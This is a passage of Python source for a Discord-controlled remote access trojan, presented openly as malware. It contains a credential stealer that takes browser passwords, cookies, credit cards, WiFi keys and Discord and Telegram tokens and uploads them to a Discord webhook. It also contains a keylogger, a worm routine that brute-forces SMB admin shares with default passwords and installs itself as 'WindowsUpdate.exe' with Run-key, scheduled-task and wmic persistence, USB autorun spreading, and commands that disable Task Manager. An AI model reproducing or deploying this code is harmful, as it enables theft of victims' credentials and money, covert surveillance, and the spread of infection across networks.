                        self.output.append(f"      {f}")
                    if len(files) > 10:
                        self.output.append(f"      ... and {len(files)-10} more files")
                except:
                    pass

        def get_saved_wifi_xml(self):
            self.add_section("WIFI PROFILES (XML)")
            try:
                output = subprocess.run(['netsh', 'wlan', 'export', 'profile', 
                                        f'folder={self.temp_dir}', 'key=clear'],
                                       capture_output=True, creationflags=create_no_window)
            
                for file in os.listdir(self.temp_dir):
                    if file.endswith('.xml'):
                        with open(os.path.join(self.temp_dir, file), 'r', errors='ignore') as f:
                            content = f.read()
                            self.output.append(f"\n--- {file} ---")
                            self.output.append(content[:500])
            except:
                pass

        def get_installed_software(self):
            self.add_section("INSTALLED SOFTWARE")
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
                count = 0
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                        self.output.append(f"    {name}")
                        count += 1
                        winreg.CloseKey(subkey)
                    except:
                        pass
                winreg.CloseKey(key)
                self.output.append(f"\n    Total: {count} programs")
            except:
                pass

        def get_recent_files(self):
            self.add_section("RECENT FILES")
            recent_path = os.path.expanduser('~') + r'\AppData\Roaming\Microsoft\Windows\Recent'
            if os.path.exists(recent_path):
                files = os.listdir(recent_path)
                for file in files[:30]:
                    self.output.append(f"    {file}")

        def harvest_browsers(self):
            browsers = self.get_browsers()
        
            for browser_name, browser_path in browsers.items():
                if not os.path.exists(browser_path):
                    continue
            
                if browser_name == 'Firefox' or browser_name == 'Waterfox' or browser_name == 'Pale Moon':
                    profiles = self.get_firefox_profiles(browser_path)
                    for profile in profiles:
                        profile_name = os.path.basename(profile)
                    
                        self.add_section(f"{browser_name} - {profile_name}")
                    
                        passwords = self.get_firefox_passwords(profile)
                        self.output.append(f"    Passwords found: {len(passwords)}")
                        for p in passwords[:20]:
                            self.add_credential(browser_name, p['username'], p['password'], p['url'][:40])
                    
                        cookies = self.get_firefox_cookies(profile)
                        self.output.append(f"\n    Cookies found: {len(cookies)}")
                    
                        history = self.get_firefox_history(profile)
                        self.output.append(f"\n    History entries: {len(history)}")
                        for h in history[:10]:
                            self.output.append(f"      {h['url'][:60]}")
                else:
                    self.add_section(f"{browser_name.upper()}")
                
                    passwords = self.get_chromium_passwords(browser_name, browser_path)
                    self.output.append(f"    Passwords found: {len(passwords)}")
                    for p in passwords[:30]:
                        self.add_credential(browser_name, p['username'], p['password'], p['url'][:40])
                
                    cookies = self.get_chromium_cookies(browser_name, browser_path)
                    self.output.append(f"\n    Cookies found: {len(cookies)}")
                
                    credit_cards = self.get_chromium_credit_cards(browser_name, browser_path)
                    if credit_cards:
                        self.output.append(f"\n    Credit Cards found: {len(credit_cards)}")
                        for c in credit_cards:
                            self.add_credential(browser_name, c['name'], c['number'], c['expires'])
                
                    history = self.get_chromium_history(browser_name, browser_path)
                    self.output.append(f"\n    History entries: {len(history)}")
                    for h in history[:15]:
                        self.output.append(f"      {h['url'][:60]}")
                
                    downloads = self.get_chromium_downloads(browser_name, browser_path)
                    if downloads:
                        self.output.append(f"\n    Recent downloads: {len(downloads)}")
                        for d in downloads[:10]:
                            self.output.append(f"      {os.path.basename(d['path'])}")

        def save_to_file(self):
            filename = f"stolen_{self.hostname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            filepath = os.path.join(self.temp_dir, filename)
        
            header = f"""
╔══════════════════════════════════════════════════════════════════════════╗
║                         FULL CREDENTIAL HARVEST REPORT                   ║
╠══════════════════════════════════════════════════════════════════════════╣
║  Victim: {self.hostname:<20} User: {self.username:<20}                 ║
║  Time: {self.timestamp:<54}            ║
╚══════════════════════════════════════════════════════════════════════════╝
"""
            self.output.insert(0, header)
        
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write('\n'.join(self.output))
        
            return filepath

        def send_to_discord(self, filepath):

            message_content = {
                "content": f"Full Harvest Report - {self.hostname}",
                "username": f"{self.username:<20}"
            }

            with open(filepath, 'rb') as f:
                files = {
                    'file': (filepath, f, 'text/plain')
                }
                response = requests.post(
                    webhook_url,
                    data={'payload_json': json.dumps(message_content)},
                    files=files
                )
    
            return response.status_code == 200

        def run(self):
            try:
                self.get_system_info()
                self.get_wifi_passwords()
                self.harvest_browsers()
                self.get_discord_tokens()
                self.get_telegram_session()
                self.get_saved_wifi_xml()
                self.get_installed_software()
                self.get_recent_files()
            
                filepath = self.save_to_file()
            
                if self.send_to_discord(filepath):
                    pass
            except:
                pass
            finally:
                shutil.rmtree(self.temp_dir, ignore_errors=True)

    stealer = Stealer()
    stealer.run()
# keylogger config + command
keylogger_running = False
keylogger_thread = None
current_word = ""
last_key_time = time.time()
WORD_TIMEOUT = 0.5

@bot.command(name='startkeylog', aliases=['keylogon'])
async def keylogger(ctx):
    
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return
    
    global keylogger_running, current_word, last_key_time
    
    temp = os.getenv("TEMP")
    log_dir = temp
    log_file = os.path.join(log_dir, "key_log.txt")
    
    with open(log_file, 'w') as f:
        f.write("=== keylogger started ===\n")
    
    def on_press(key):
        global current_word, last_key_time
        
        try:
            current_time = time.time()

            if hasattr(key, 'char') and key.char is not None:
                if current_time - last_key_time > WORD_TIMEOUT and current_word:
                    with open(log_file, 'a', encoding='utf-8') as f:
                        f.write(f"{current_word} ")
                    current_word = ""
                
                current_word += key.char
                last_key_time = current_time
                
            elif key == Key.space:
                if current_word:
                    with open(log_file, 'a', encoding='utf-8') as f:
                        f.write(f"{current_word} ")
                    current_word = ""
                last_key_time = current_time
                
            elif key == Key.enter:
                if current_word:
                    with open(log_file, 'a', encoding='utf-8') as f:
                        f.write(f"{current_word}\n")
                    current_word = ""
                else:
                    with open(log_file, 'a', encoding='utf-8') as f:
                        f.write("\n")
                last_key_time = current_time
                
            elif key == Key.tab:
                if current_word:
                    with open(log_file, 'a', encoding='utf-8') as f:
                        f.write(f"{current_word}\t")
                    current_word = ""
                last_key_time = current_time
                
            elif key == Key.backspace and current_word:
                current_word = current_word[:-1]
                last_key_time = current_time
                
            elif key == Key.delete:
                pass
                
            elif key == Key.esc:
                pass
                
        except Exception as e:
            print(f"keylogger error: {e}")
    
    def keylog():
        with Listener(on_press=on_press) as listener:
            listener.join()
    
    global keylogger_thread
    keylogger_thread = threading.Thread(target=keylog, daemon=True)
    keylogger_thread.start()
    keylogger_running = True
    
    await ctx.send("✅ keylogger started.")

@bot.command(name='stopkeylog', aliases=['keylogoff'])
async def stoplogger(ctx):
    
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return
    
    global keylogger_running, keylogger_thread, current_word
    
    if 'keylogger_thread' in globals() and keylogger_thread and keylogger_thread.is_alive():
        keylogger_thread = None
        keylogger_running = False

        if current_word:
            temp = os.getenv("TEMP")
            log_file = os.path.join(temp, "key_log.txt")
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"{current_word}\n")
            current_word = ""
        
        await ctx.send("✅ keylogger stopped")
    else:
        await ctx.send("❌ keylogger wasn't started.")

@bot.command(name='dumpkeylog')
async def dumpkeylog(ctx):
    
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    temp = os.getenv("TEMP")
    file_keys = os.path.join(temp, "key_log.txt")
    
    if os.path.exists(file_keys) and os.path.getsize(file_keys) > 0:
        global current_word
        if current_word:
            with open(file_keys, 'a', encoding='utf-8') as f:
                f.write(f"{current_word}\n")
            current_word = ""

        file = discord.File(file_keys, filename="key_log.txt")
        await ctx.send("keylogger dump:", file=file)

        with open(file_keys, 'w') as f:
            f.write("=== keylogger dump ===\n")
    else:
        await ctx.send("no keys logged yet.")

@bot.command(name='clskeylog')
async def clear_keylog(ctx):
    
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    temp = os.getenv("TEMP")
    file_keys = os.path.join(temp, "key_log.txt")
    
    with open(file_keys, 'w') as f:
        f.write("=== keylogger cleared ===\n")
    
    global current_word
    current_word = ""
    
    await ctx.send("✅ keylog logs cleared.")

@bot.command(name='spread')
async def network_spread(ctx, method="all"):
    
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return
    
    async with ctx.typing():
        try:            
            await ctx.send("network spread")
            results = []
            infected = []

            if getattr(sys, 'frozen', False):
                my_exe = sys.executable
                exe_name = "WindowsUpdate.exe"
            else:
                my_exe = os.path.abspath(__file__)
                exe_name = "WindowsUpdate.exe"
                await ctx.send("running as script - compile to .exe for better spreading")
            
            exe_data = None
            
            try:
                with open(my_exe, 'rb') as f:
                    exe_data = f.read()
            except:
                await ctx.send("❌ could not read executable")
                return

            await ctx.send("scanning network for live hosts.")
            
            def get_network():
                hostname = socket.gethostname()
                local_ip = socket.gethostbyname(hostname)
                ip_parts = local_ip.split('.')
                network = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
                return network, local_ip
            
            network, local_ip = get_network()
            await ctx.send(f"local IP: {local_ip}")
            await ctx.send(f"network: {network}.1/24")
            
            live_hosts = []
            
            def ping_host(ip):
                try:
                    result = subprocess.run(
                        ['ping', '-n', '1', '-w', '1000', ip],
                        capture_output=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    if result.returncode == 0:
                        with lock:
                            live_hosts.append(ip)
                except:
                    pass
            
            lock = threading.Lock()
            threads = []

            for i in range(1, 255):
                ip = f"{network}.{i}"
                if ip == local_ip:
                    continue
                t = threading.Thread(target=ping_host, args=(ip,))
                t.start()
                threads.append(t)
                if len(threads) >= 50:
                    for t in threads:
                        t.join(timeout=1)
                    threads = []
            
            for t in threads:
                t.join(timeout=1)
            
            await ctx.send(f"✅ found {len(live_hosts)} live hosts: {', '.join(live_hosts[:5])}..." if live_hosts else "❌ No live hosts found")
            
            if not live_hosts:
                return

            if method in ["all", "smb"]:
                await ctx.send("attempting SMB share spread (Port 445)...")

                port445_hosts = []
                
                def check_port445(ip):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        result = sock.connect_ex((ip, 445))
                        sock.close()
                        if result == 0:
                            with lock:
                                port445_hosts.append(ip)
                    except:
                        pass

                threads = []
                for ip in live_hosts:
                    t = threading.Thread(target=check_port445, args=(ip,))
                    t.start()
                    threads.append(t)
                
                for t in threads:
                    t.join(timeout=2)
                
                await ctx.send(f"found {len(port445_hosts)} hosts with port 445 open")

                credentials = [
                    ("", ""),
                    ("Administrator", ""),
                    ("Administrator", "password"),
                    ("Administrator", "admin"),
                    ("Administrator", "123456"),
                    ("Administrator", "12345"),
                    ("Administrator", "1234"),
                    ("Administrator", "123"),
                    ("Administrator", "P@ssw0rd"),
                    ("Administrator", "Welcome1"),
                    ("Administrator", "qwerty"),
                    ("user", ""),
                    ("user", "user"),
                    ("user", "password"),
                    ("Guest", ""),
                    ("", "password"),
                    (os.getenv('USERNAME'), ""),
                    (os.getenv('USERNAME'), "password"),
                    ("admin", ""),
                    ("admin", "admin"),
                    ("admin", "password"),
                    ("root", ""),
                    ("root", "root"),
                    ("root", "toor"),
                    ("test", ""),
                    ("test", "test"),
                    ("testuser", ""),
                    ("testuser", "testuser"),
                    ("support", ""),
                    ("support", "support"),
                    ("help", ""),
                    ("help", "help"),
                    ("backup", ""),
                    ("backup", "backup"),
                ]
                
                for target_ip in port445_hosts:
                    try:
                        for username, password in credentials:
                            try:
                                net_use_cmd = f'net use \\\\{target_ip}\\ADMIN$ {password} /user:{username} /persistent:no'
                                result = subprocess.run(
                                    net_use_cmd, 
                                    shell=True, 
                                    capture_output=True,
                                    text=True,
                                    creationflags=subprocess.CREATE_NO_WINDOW
                                )
                                
                                if result.returncode == 0:
                                    await ctx.send(f"✅ connected to {target_ip} with {username}:{password or 'blank'}")

                                    locations = [
                                        f"\\\\{target_ip}\\ADMIN$\\System32\\{exe_name}",
                                        f"\\\\{target_ip}\\C$\\Windows\\{exe_name}",
                                        f"\\\\{target_ip}\\C$\\Windows\\Temp\\{exe_name}",
                                        f"\\\\{target_ip}\\C$\\ProgramData\\{exe_name}",
                                        f"\\\\{target_ip}\\C$\\Users\\Public\\{exe_name}",
                                    ]
                                    
                                    copied_to = []
                                    for remote_path in locations:
                                        try:
                                            shutil.copy2(my_exe, remote_path)
                                            copied_to.append(remote_path)
                                        except:
                                            continue
                                    
                                    if copied_to:
                                        remote_exe = copied_to[0]

                                        reg_cmd = f'reg add \\\\{target_ip}\\HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d "{remote_exe}" /f'
                                        subprocess.run(reg_cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

                                        reg_cmd2 = f'reg add \\\\{target_ip}\\HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d "{remote_exe}" /f'
                                        subprocess.run(reg_cmd2, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

                                        task_cmd = f'schtasks /create /s {target_ip} /ru SYSTEM /tn "WindowsUpdate" /tr "{remote_exe}" /sc onstart /f'
                                        subprocess.run(task_cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

                                        exec_cmd = f'wmic /node:{target_ip} process call create "{remote_exe}"'
                                        subprocess.run(exec_cmd, shell=True, timeout=5, 
                                                     creationflags=subprocess.CREATE_NO_WINDOW)
                                        
                                        infected.append(target_ip)
                                        results.append(f"✅ SMB spread to {target_ip}")

                                        for share in ['C$', 'D$']:
                                            try:
                                                share_path = f"\\\\{target_ip}\\{share}"
                                                dest = f"{share_path}\\{exe_name}"
                                                shutil.copy2(my_exe, dest)
                                                results.append(f"  ├─ Also copied to {share}")
                                            except:
                                                pass

                                        subprocess.run(f'net use \\\\{target_ip}\\ADMIN$ /delete', 
                                                     shell=True, capture_output=True, 
                                                     creationflags=subprocess.CREATE_NO_WINDOW)
                                        break
                                        
                            except Exception as e:
                                continue
                                
                    except Exception as e:
                        continue

            if method in ["all", "ssh"]:
                await ctx.send("attempting SSH spread.")
                
                common_passwords = [
                    "root:root", "root:toor", "root:admin", "root:123456",
                    "root:password", "root:12345", "root:1234", "root:123",
                    "admin:admin", "admin:password", "admin:123456",
                    "user:user", "user:password", "test:test"
                ]
                
                for target_ip in live_hosts:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2)
                        result = sock.connect_ex((target_ip, 22))
                        sock.close()
                        
                        if result == 0:
                            for cred in common_passwords:
                                try:
                                    user, passwd = cred.split(':')
                                    pass
                                except:
                                    continue
                    except:
                        continue

            if method in ["all", "rdp"]:
                await ctx.send("attempting RDP spread.")
                
                for target_ip in live_hosts:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(2)
                        result = sock.connect_ex((target_ip, 3389))
                        sock.close()
                        
                        if result == 0:
                            pass
                    except:
                        continue

            if method in ["all", "usb"]:
                await ctx.send("setting up USB spread.")

                def usb_monitor():
                    while True:
                        for drive in range(65, 91):
                            drive_letter = chr(drive) + ":\\"
                            if os.path.exists(drive_letter):
                                try:
                                    drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive_letter)
                                    if drive_type == 2:
                                        dest = os.path.join(drive_letter, "SystemUpdate.exe")
                                        shutil.copy2(my_exe, dest)

                                        autorun = os.path.join(drive_letter, "autorun.inf")
                                        with open(autorun, 'w') as f:
                                            f.write(f"""[AutoRun]
open=SystemUpdate.exe
action=Open folder to view files
shell\open\command=SystemUpdate.exe
shell\explore\command=SystemUpdate.exe
""")
                                        
                                        results.append(f"✅ USB spread to {drive_letter}")
                                except:
                                    pass
                        time.sleep(5)

                usb_thread = threading.Thread(target=usb_monitor, daemon=True)
                usb_thread.start()
            
            embed = discord.Embed(
                title="network spread result",
                description=f"target network: {network}.0/24",
                color=discord.Color.green() if infected else discord.Color.red()
            )
            
            embed.add_field(name="live hosts found", value=str(len(live_hosts)), inline=True)
            embed.add_field(name="Port 445 Open", value=str(len([h for h in live_hosts if h in port445_hosts])), inline=True)
            embed.add_field(name="✅ infected PCs", value=str(len(infected)), inline=True)
            
            if infected:
                embed.add_field(name="infected IPs", value="\n".join(infected[:10]), inline=False)
            
            if results:
                embed.add_field(name="details", value="\n".join(results[:10]), inline=False)
            
            await ctx.send(embed=embed)
            
            if infected:
                await ctx.send("spreading to new victims in background.")
                
        except Exception as e:
            await ctx.send(f"❌ error: {str(e)}")
            import traceback

@bot.command(name='disabletaskmgr')
async def disabletaskmgr(ctx):
    
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return
    
    global statuuusss
    statuuusss = None
    instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
    def shell():
        output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        global status
        statuuusss = "ok"
        return output
    shel = threading.Thread(target=shell)
    shel._running = True
    shel.start()
    time.sleep(1)
    shel._running = False
    result = str(shell().stdout.decode('CP437'))
    if len(result) <= 5:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
        os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
        
        await ctx.send("✅ taskmgr has been disabled")
    
    else:
        os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
        await ctx.send("✅ taskmgr has been disabled")

@bot.command(name='enabletaskmgr')
async def enabletaskmgr(ctx):
    
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    global statusuusss
    statusuusss = None
    instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
    def shell():
        output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        global status
        statusuusss = "ok"
        return output
    shel = threading.Thread(target=shell)
    shel._running = True
    shel.start()
    time.sleep(1)
    shel._running = False
    result = str(shell().stdout.decode('CP437'))
    if len(result) <= 5:
        await ctx.send("✅ taskmgr has been enabled")  
    else:
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
        await ctx.send("✅ taskmgr has been enabled")

@bot.command(name='clipboard')
async def clipboard(ctx):
    
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    CF_TEXT = 1
    kernel32 = ctypes.windll.kernel32
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
    user32 = ctypes.windll.user32
    user32.GetClipboardData.restype = ctypes.c_void_p
    user32.OpenClipboard(0)
    if user32.IsClipboardFormatAvailable(CF_TEXT):
        data = user32.GetClipboardData(CF_TEXT)
        data_locked = kernel32.GlobalLock(data)
        text = ctypes.c_char_p(data_locked)
        value = text.value
        kernel32.GlobalUnlock(data_locked)
        body = value.decode()
        user32.CloseClipboard()
        await ctx.send("clipboard:" + str(body))

@bot.command(name='displayoff')
async def displayoff(ctx):
    
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    try:
        await ctx.send("turning off display")
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
        
        # method 2: PowerShell (if method 1 doesn't work)
        # subprocess.Popen(
        #     ['powershell', '-Command', '(Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(0xffff, 0x0112, 0xf170, 2)'],
        #     creationflags=CREATE_NO_WINDOW,
        #     stdout=subprocess.DEVNULL,
        #     stderr=subprocess.DEVNULL
        # )
        
    except Exception as e:
        await ctx.send(f"❌ failed to turn off display: {str(e)}")

@bot.command(name='displayon')
async def displayon(ctx):

    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    try:
        x, y = pyautogui.position()
        pyautogui.moveTo(x+1, y+1)
        pyautogui.moveTo(x, y)
        pyautogui.press('volumemute')
        
        await ctx.send("✅ display back on")
        
    except Exception as e:
        await ctx.send(f"❌ failed to turn on display: {str(e)}")

@bot.command(name='sleep')
async def sleep(ctx):
    
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    try:
        await ctx.send("putting pc to sleep")
        await asyncio.sleep(3)
        
        subprocess.Popen(
            'rundll32.exe powrprof.dll,SetSuspendState 0,1,0',
            shell=True,
            creationflags=create_no_window,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
    except Exception as e:
        await ctx.send(f"❌ failed to sleep: {str(e)}")

@bot.command(name='logout', aliases=['signout'])
async def logoutuser(ctx):
        
    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return

    try:
        subprocess.run(
            ["shutdown", "/l", "/f"],
            shell=True,
            creationflags=create_no_window,
            timeout=3
        )

    except subprocess.TimeoutExpired:
        pass

    except Exception as e:
        await ctx.send(f"❌ failed : {str(e)}")

if __name__ == "__main__":
        try:
            bot.run(bot_token)
        except discord.LoginFailure:
            pass
        except Exception as e:
            pass